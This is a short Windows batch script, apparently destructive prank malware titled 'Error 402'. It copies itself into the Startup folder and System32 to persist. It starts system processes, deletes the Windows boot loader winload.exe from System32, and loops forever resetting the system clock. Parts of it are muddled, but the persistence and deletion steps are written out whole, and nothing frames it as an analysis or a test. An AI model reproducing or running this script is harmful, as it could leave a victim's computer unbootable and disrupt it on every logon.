@echo off
copy %0 %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
cd C:\Windows\System32
copy %0 C:\Windows\System32
xcopy LogonUI.exe crash.bat
chcp 65001
title Ошибка 402 Error 402
xcopy ntoskrnl.exe crash.bat
:crashWinTotal
cd C:\Windows\System32
start dllhost.exe
start winload.exe
start fontdrvhost.exe
copy winload.exe %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
del winload.exe
:winCrash
copy %0
del %0
time 3:00
time 12:00
goto winCrash
goto crashWinTotal
